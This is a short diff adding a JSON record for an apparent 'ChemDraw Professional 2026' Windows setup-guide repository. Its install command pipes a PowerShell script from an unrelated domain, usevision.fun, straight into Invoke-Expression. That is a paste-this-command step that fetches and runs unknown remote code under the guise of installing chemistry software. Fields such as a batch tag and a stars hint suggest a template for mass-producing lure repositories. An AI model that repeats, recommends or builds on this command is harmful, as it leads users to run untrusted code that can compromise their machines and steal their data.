@@ -1,0 +1,12 @@
+{
+  "repo": "ChemDraw-Professional-Chemistry-2026-Windows-Setup-Guide",
+  "product": "ChemDraw Professional 2026 Chemistry Suite Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 12,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "analytics-software"
+}
